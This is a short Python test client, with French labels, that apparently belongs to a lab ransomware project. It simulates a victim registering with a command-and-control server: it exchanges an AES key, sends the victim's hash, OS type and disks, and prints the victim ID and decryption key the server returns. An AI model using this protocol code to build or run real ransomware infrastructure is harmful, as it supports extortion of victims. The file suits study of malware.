import string
import random
import utile.network as network
import utile.message as message
import utile.security as security
import utile.config as config


# Constantes
AES_GCM = True
cle_aes = b''
IP = "192.168.254.1"
PORT = 8381

def print_menu():
    print("1 Création victime")
    print("2 Envoi INITIALIZE_REQ")
    print("3 Quit")


def simulate_hash(longueur=0):
    lettre = string.hexdigits
    return ''.join(random.choice(lettre) for i in range(longueur))


def main():
    s_client = network.connect_to_serv(port=PORT)
    cle_aes = security.diffie_hellman_recv_key(s_client)
    print(f"Clé de chiffrement réceptionnée : {cle_aes} {type(cle_aes)}")
    choix = 0
    hash_victim = ''
    os = ''
    disks = ''
    while choix != 3:
        print_menu()
        choix =int(input("Votre choix "))
        if choix == 1:
            hash_victim = simulate_hash(256)
            disks = input("Disques ? (c:,d:,f:) : ")
            os = input("type d'OS ? (SERVER ou WORKSTATION) : ")
        if choix == 2:
            msg = message.set_message('initialize_req', [hash_victim, os, disks])
            msg = security.aes_encrypt(msg, cle_aes)
            network.send_message(s_client, msg)

            msg = network.receive_message(s_client)
            msg = security.aes_decrypt(msg, cle_aes)
            type_msg = message.get_message_type(msg)
            if type_msg == 'INITIALIZE_KEY':
                print(f"L'ID de victime est : {msg['KEY_RESP']}")
                print(f"Clé de decrpytage: {msg['KEY']}")
        if choix == 3:
            s_client.close()
    exit(0)


if __name__ == '__main__':
    main()